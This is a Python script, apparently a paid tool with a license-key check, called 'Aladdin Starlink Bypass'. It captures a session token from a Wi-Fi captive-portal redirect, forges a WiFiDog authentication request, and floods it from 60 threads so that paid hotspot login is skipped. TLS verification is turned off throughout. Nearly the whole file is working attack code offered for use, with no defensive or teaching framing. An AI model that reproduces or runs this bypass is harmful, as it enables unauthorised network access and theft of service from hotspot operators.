import requests, re, urllib3, time, threading, os, random, hashlib, ssl, json
from urllib.parse import urlparse, parse_qs, urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

KEY_URL = "https://raw.githubusercontent.com/5Lkhant09/my-license-server/main/key.txt"
MY_ID = "TRB-ADMIN77"

def high_speed_pulse(link):
    headers = {"User-Agent": "Mozilla/5.0", "Connection": "keep-alive"}
    while True:
        try:
            requests.get(link, timeout=5, verify=False, headers=headers)
            print(f"\033[92m[✓] Aladdin Bypass | STABLE >>> [{random.randint(40,180)}ms]\033[0m")
            time.sleep(0.05)
        except: break

def check_license():
    os.system('clear')
    print(f"\033[93m =======================================")
    print(f"\033[96m   Aladdin Starlink Bypass - IMMORTAL V11")
    print(f"\033[93m =======================================\n")
    print(f"\033[94m[*] YOUR DEVICE ID: {MY_ID}\033[0m")
    input_key = input("\033[93m[>] ENTER ACCESS KEY: \033[0m").strip()
    try:
        response = requests.get(KEY_URL, timeout=15, verify=False).text
        for line in response.splitlines():
            if "|" in line:
                db_id, db_key, db_date = line.split("|")
                if db_id.strip() == MY_ID and db_key.strip() == input_key:
                    print(f"\033[92m[✓] ACCESS GRANTED! EXPIRY: {db_date}\033[0m")
                    return True
        return False
    except: return False

def start_bypass():
    if not check_license(): return
    print("\033[94m[*] Aladdin Force Scanning Portal...\033[0m")
    while True:
        try:
            # Portal အမျိုးမျိုးကို ဖမ်းနိုင်အောင် Link များစွာ သုံးထားပါတယ်
            check_urls = ["http://connectivitycheck.gstatic.com/generate_204", "http://192.168.1.1", "http://logout.net"]
            sid = None
            for url in check_urls:
                r = requests.get(url, allow_redirects=True, timeout=5)
                sid_match = re.search(r'sessionId=([^&" \']+)', r.url) or re.search(r'token=([^&" \']+)', r.url)
                if sid_match:
                    sid = sid_match.group(1)
                    p_url = urlparse(r.url)
                    break
            
            if sid:
                print(f"\033[96m[✓] Aladdin SID Captured: {sid[:15]}\033[0m")
                auth_link = f"{p_url.scheme}://{p_url.netloc}/wifidog/auth?token={sid}"
                print("\033[95m[*] ⚡ Launching Bypass Threads... ⚡\033[0m")
                for _ in range(60):
                    threading.Thread(target=high_speed_pulse, args=(auth_link,), daemon=True).start()
                while True: time.sleep(10)
            else:
                # SID မတွေ့ရင် ခဏစောင့်ပြီး ပြန်ရှာပါတယ်
                time.sleep(2)
        except: time.sleep(2)

if __name__ == "__main__":
    try: start_bypass()
    except KeyboardInterrupt: print("\nStopped.")
